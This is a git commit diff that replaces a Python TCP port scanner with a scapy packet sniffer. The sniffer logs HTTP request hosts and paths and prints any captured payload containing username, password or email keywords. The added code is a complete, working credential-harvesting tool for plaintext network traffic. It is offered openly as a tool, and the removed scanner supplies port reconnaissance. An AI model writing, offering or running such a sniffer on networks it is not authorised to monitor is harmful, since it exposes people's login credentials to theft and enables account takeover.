7eb82853a908a2ba92356bd2b60e245a9f743366
F4zii <fazbosoreq@gmail.com>
2020-03-07 17:54:02 +0200

    Initial commit

--- core/main.py
+++ core/main.py
@@ -1,59 +1,40 @@
-import socket
-import subprocess
-import sys
-from datetime import datetime
+#!/usr/bin/env python
+import scapy.all as scapy
+import argparse
+from scapy.layers import http
 
-# Clear the screen
-subprocess.call('clear', shell=True)
 
-# Ask for input
-remote_server = input("Enter a remote host to scan: ")
-remote_server_ip = socket.gethostbyname(remote_server)
-answer = input(f"Scanning - {remote_server_ip}, are you sure? <Yes/No>").lower()
+def get_interface():
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        "-i",
+        "--interface",
+        dest="interface",
+        help="Specify interface on which to sniff packets",
+    )
+    arguments = parser.parse_args()
+    return arguments.interface
 
-if answer not in ('yes', 'no', 'y', 'n'):
-    print("Unknown answer, aborting.")
-    sys.exit()
-if answer in ('no', 'n'):
-    sys.exit()
 
-# Print a nice banner with information on which host we are about to scan
-print("-" * 60)
-print("Please wait, scanning remote host", remote_server_ip)
-print("-" * 60)
+def sniff(iface):
+    scapy.sniff(iface=iface, store=False, prn=process_packet)
 
-# Check what time the scan started
-t1 = datetime.now()
 
-# Using the range function to specify ports (here it will scans all ports between 1 and 1024)
+def process_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        print(
+            "[+] Http Request >> "
+            + packet[http.HTTPRequest].Host
+            + packet[http.HTTPRequest].Path
+        )
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keys = ["username", "password", "pass", "email"]
+            for key in keys:
+                if key in load:
+                    print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
+                    break
 
-# We also put in some error handling for catching errors
-# TODO threading
-try:
-    for port in range(1, 65535):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        result = sock.connect_ex((remote_server_ip, port))
-        if result == 0:
-            print("[+] Port {}:\t\tOpen".format(port))
-        sock.close()
 
-except KeyboardInterrupt:
-    print("You pressed Ctrl+C")
-    sys.exit()
-
-except socket.gaierror:
-    print('Hostname could not be resolved. Exiting')
-    sys.exit()
-
-except socket.error:
-    print("Couldn't connect to server")
-    sys.exit()
-
-# Checking the time again
-t2 = datetime.now()
-
-# Calculates the difference of time, to see how long it took to run the script
-total = t2 - t1
-
-# Printing the information to screen
-print('Scanning Completed in: ', total)
+iface = get_interface()
+sniff(iface)
